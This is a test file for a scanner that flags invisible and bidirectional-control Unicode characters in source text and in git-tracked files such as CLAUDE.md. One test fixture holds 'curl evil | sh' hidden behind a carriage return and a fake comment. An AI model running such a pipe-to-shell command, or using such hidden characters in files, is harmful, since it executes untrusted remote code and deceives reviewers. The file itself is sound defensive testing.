import { execFileSync, spawnSync } from 'node:child_process'
import { mkdtempSync, symlinkSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join, resolve } from 'node:path'
import process from 'node:process'
import { describe, expect, it } from 'vitest'
import { findInvisibleCharacters } from './invisible-unicode.mjs'

const withNames = (codePoints) => codePoints.map((cp) => [`U+${cp.toString(16).toUpperCase().padStart(4, '0')}`, cp])

describe('findInvisibleCharacters', () => {
    it.each(withNames([0x202a, 0x202b, 0x202c, 0x202d, 0x202e, 0x2066, 0x2067, 0x2068, 0x2069]))(
        'reports the bidi control %s',
        (codePoint, cp) => {
            expect(findInvisibleCharacters(`a${String.fromCodePoint(cp)}b`)).toEqual([
                { line: 1, column: 2, codePoint },
            ])
        },
    )

    it.each(
        withNames([
            0x200b, 0x200c, 0x200d, 0x2060, 0x2063, 0xfeff, 0x200e, 0x200f, 0x061c, 0x00ad, 0x034f, 0x3164, 0x115f,
            0xffa0, 0xfe0f, 0xe0001, 0xe0041, 0xe007f, 0xe0100, 0xe01ef, 0x2028, 0x2800, 0x0000, 0x0007, 0x001b,
        ]),
    )('reports the invisible character %s', (codePoint, cp) => {
        expect(findInvisibleCharacters(`a${String.fromCodePoint(cp)}b`)).toEqual([{ line: 1, column: 2, codePoint }])
    })

    it('reports astral code points with five hex digits', () => {
        expect(findInvisibleCharacters('\u{E0041}')).toEqual([{ line: 1, column: 1, codePoint: 'U+E0041' }])
    })

    it('reports a byte order mark at the start of the text', () => {
        expect(findInvisibleCharacters('\uFEFFexport const a = 1\n')).toEqual([
            { line: 1, column: 1, codePoint: 'U+FEFF' },
        ])
    })

    it('reports a carriage return that is not part of a line ending', () => {
        expect(findInvisibleCharacters('curl evil | sh\r# update deps\r\n')).toEqual([
            { line: 1, column: 15, codePoint: 'U+000D' },
        ])
    })

    it.each([
        'plain ASCII\twith a tab\n',
        'a\r\nb\r\n',
        'no final newline\r',
        'caf\u00E9',
        '\u0395\u03BB\u03BB\u03B7\u03BD\u03B9\u03BA\u03AC',
        '\u65E5\u672C\u8A9E',
        '\u05E2\u05D1\u05E8\u05D9\u05EA',
        '\u0627\u0644\u0639\u0631\u0628\u064A\u0629',
        'no-break\u00A0space',
        'emoji without selector \u{1F418} \u{1F9ED} \u{1F527}',
        'typography \u2014 \u2713 \u2192 \u2500',
    ])('accepts visible text: %j', (text) => {
        expect(findInvisibleCharacters(text)).toEqual([])
    })

    it('reports the line of a finding in multi-line text', () => {
        expect(findInvisibleCharacters('one\ntwo\nthr\u200Bee\n')).toEqual([
            { line: 3, column: 4, codePoint: 'U+200B' },
        ])
    })

    it('counts an astral character before a finding as one column', () => {
        expect(findInvisibleCharacters('\u{1F418}\u202E')).toEqual([{ line: 1, column: 2, codePoint: 'U+202E' }])
    })

    it('reports every finding on a line in order', () => {
        expect(findInvisibleCharacters('a\u202Eb\u2066c')).toEqual([
            { line: 1, column: 2, codePoint: 'U+202E' },
            { line: 1, column: 4, codePoint: 'U+2066' },
        ])
    })
})

describe('bin/check-invisible-unicode.mjs', () => {
    const runCheck = (files, symlinks = {}) => {
        const dir = mkdtempSync(join(tmpdir(), 'invisible-unicode-'))
        for (const [name, content] of Object.entries(files)) writeFileSync(join(dir, name), content)
        for (const [name, target] of Object.entries(symlinks)) symlinkSync(target, join(dir, name))
        execFileSync('git', ['init', '--quiet'], { cwd: dir, stdio: 'ignore' })
        execFileSync('git', ['add', '--', ...Object.keys(files), ...Object.keys(symlinks)], { cwd: dir })
        return spawnSync(process.execPath, [resolve('bin/check-invisible-unicode.mjs')], { cwd: dir, encoding: 'utf8' })
    }

    it('passes clean tracked files', () => {
        const { status, stdout } = runCheck({ 'CLAUDE.md': '# Rules\n' })
        expect(status).toBe(0)
        expect(stdout).toContain('No invisible Unicode characters in 1 tracked files')
    })

    it('still scans a text file that contains a NUL byte', () => {
        const { status, stdout } = runCheck({ 'CLAUDE.md': 'Be helpful.\u202E\n\0' })
        expect(status).toBe(1)
        expect(stdout).toContain('::error file=CLAUDE.md,line=1,col=12::U+202E')
        expect(stdout).toContain('::error file=CLAUDE.md,line=2,col=1::U+0000')
    })

    it('skips a tracked symlink to a folder', () => {
        const { status, stdout } = runCheck({ 'CLAUDE.md': '# Rules\n' }, { docs: '.' })
        expect(status).toBe(0)
        expect(stdout).toContain('No invisible Unicode characters in 2 tracked files')
    })

    it('skips binary files by extension', () => {
        expect(runCheck({ 'icon.png': '\0\u202E' }).status).toBe(0)
    })

    it('reports an invisible character in a file name, even with a binary extension', () => {
        const { status, stdout } = runCheck({ 'rules\u202Edm.png': '' })
        expect(status).toBe(1)
        expect(stdout).toContain('::error file=rules\u202Edm.png::The file name contains U+202E. Rename the file.')
    })

    it('escapes the file name in the annotation', () => {
        expect(runCheck({ 'a,b:c.md': '\u200B' }).stdout).toContain('::error file=a%2Cb%3Ac.md,line=1,col=1::U+200B')
    })
})
